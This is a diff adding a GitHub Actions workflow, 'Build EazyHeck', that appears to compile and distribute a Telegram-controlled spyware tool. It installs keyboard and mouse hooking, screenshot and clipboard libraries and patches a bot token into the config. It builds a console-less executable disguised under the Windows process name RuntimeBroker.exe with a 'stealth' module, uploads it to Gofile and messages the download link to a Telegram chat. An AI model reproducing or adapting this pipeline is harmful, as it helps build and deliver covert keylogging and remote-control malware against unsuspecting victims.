@@ -1,1 +1,76 @@
+name: Build EazyHeck
 
+on:
+  workflow_dispatch:
+    inputs:
+      bot_token:
+        description: 'Telegram Bot Token'
+        required: true
+      chat_id:
+        description: 'Telegram Chat ID'
+        required: true
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          pip install pyinstaller aiogram==3.7.0 python-dotenv psutil pyautogui pyperclip opencv-python numpy Pillow matplotlib pynput aiohttp
+
+      - name: Patch token into bot.py
+        shell: python
+        run: |
+          import os
+          token = "${{ github.event.inputs.bot_token }}"
+          with open("bot.py", "r", encoding="utf-8") as f:
+              content = f.read()
+          content = content.replace(
+              'from stealth_init import init_stealth\n    init_stealth()',
+              'from stealth_init import init_stealth\n    init_stealth()'
+          )
+          with open("config.py", "w", encoding="utf-8") as f:
+              f.write(f'BOT_TOKEN = "{token}"\nALLOWED_USER_ID = 0\n')
+          print("Token patched!")
+
+      - name: Build exe
+        run: |
+          pyinstaller --onefile --noconsole --name RuntimeBroker --hidden-import pynput.keyboard --hidden-import pynput.mouse --add-data "handlers;handlers" bot.py
+
+      - name: Upload to Gofile
+        shell: python
+        run: |
+          import requests, os, asyncio
+          exe_path = "dist/RuntimeBroker.exe"
+          chat_id = "${{ github.event.inputs.chat_id }}"
+          builder_token = "${{ secrets.BUILDER_TOKEN }}"
+
+          server_resp = requests.get("https://api.gofile.io/servers").json()
+          server = server_resp["data"]["servers"][0]["name"]
+
+          with open(exe_path, "rb") as f:
+              upload_resp = requests.post(
+                  f"https://upload.gofile.io/uploadFile",
+                  files={"file": f},
+                  data={"token": ""}
+              ).json()
+
+          if upload_resp["status"] == "ok":
+              link = upload_resp["data"]["downloadPage"]
+              msg = f"✨ <b>EazyHeck готов!</b>\n\n📎 <a href='{link}'>Скачать .exe</a>\n\n<i>Файл будет доступен 10 дней</i>"
+          else:
+              msg = "❌ Ошибка загрузки файла на gofile"
+
+          requests.post(
+              f"https://api.telegram.org/bot{builder_token}/sendMessage",
+              json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
+          )
